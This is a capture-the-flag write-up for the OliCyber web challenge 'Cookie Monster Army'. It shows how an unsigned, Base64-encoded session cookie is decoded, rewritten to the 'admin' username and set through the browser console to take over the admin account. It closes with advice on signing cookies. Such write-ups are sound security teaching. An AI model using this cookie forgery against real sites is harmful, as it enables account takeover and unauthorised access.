# Cookie Monster Army

**Competition:** OliCyber<br>
**Category:** Web / Session Hijacking<br>
**URL:** http://cma.challs.olicyber.it

---

## Description

> *Cookie Monster is tired of this bitter world, but to conquer it he'll need all the help he can get. Enlist yourself for this mission too!*

---

## Solution

### Step 1 — Initial Reconnaissance

When visiting the site, you are greeted with a registration and login page. After creating an account and authenticating, you are redirected to:

```
http://cma.challs.olicyber.it/home.php
```

---

### Step 2 — Session Cookie Analysis

By inspecting the cookies through your browser's developer tools (F12 → Application/Storage → Cookies) or a proxy like Burp Suite, you notice a session cookie with a suspicious value:

```
MjAyNi8wMy8xMS0xNzczMjQ2NzQ4LWhhY2tlcmZyZWdz
```

The format suggests **Base64** encoding. Decoding it from the terminal:

```bash
echo "MjAyNi8wMy8xMS0xNzczMjQ2NzQ4LWhhY2tlcmZyZWdz" | base64 -d
```

**Output:**
```
2026/03/11-1773246748-<your_username>
```

---

### Step 3 — Cookie Structure

The structure of the decoded cookie is:

| Field | Value |
|---|---|
| Date | `2026/03/11` |
| Timestamp | `1773246748` |
| Username | `<your_username>` |

---

### Step 4 — Vulnerability Identified

**The session cookie is constructed simply by concatenating date, timestamp and username, with no cryptographic signature** (e.g., HMAC or signature). This means it's possible to **forge an arbitrary cookie** by modifying the username field.

The server blindly trusts the cookie's contents without verifying its integrity through any cryptographic verification.

**This is a critical Broken Authentication vulnerability.**

---

### Step 5 — Exploit

The objective is to impersonate the `admin` user. Simply:

1. Build the modified payload, keeping the same date and timestamp but changing the username:
```
2026/03/11-1773246748-admin
```

2. Encode it in Base64:
```bash
echo -n "2026/03/11-1773246748-admin" | base64
```

**Output:**
```
MjAyNi8wMy8xMS0xNzczMjQ2NzQ4LWFkbWlu
```

3. Replace the cookie value in your browser:
   - Open DevTools (`F12` → Application → Cookies)
   - Find the session cookie
   - Modify its value with the new encoded payload
   - Or use the browser console:
   ```javascript
   document.cookie = "session=MjAyNi8wMy8xMS0xNzczMjQ2NzQ4LWFkbWlu; path=/";
   ```

4. Reload the page — you are now authenticated as `admin` and the flag is revealed.

---

### Step 6 — Result

By logging in as `admin`, you obtain the challenge flag.

---

## Conclusions

Never trust client-side data without integrity verification. Session cookies must be:

- **Cryptographically signed** (e.g., with HMAC-SHA256)
- **Opaque** to the client (e.g., random token mapped server-side)
- **Non-predictable** in their structure
- **Not contain sensitive information in plaintext** (not even Base64-encoded)

A cookie that directly exposes the username, even if Base64-encoded, is a critical vulnerability.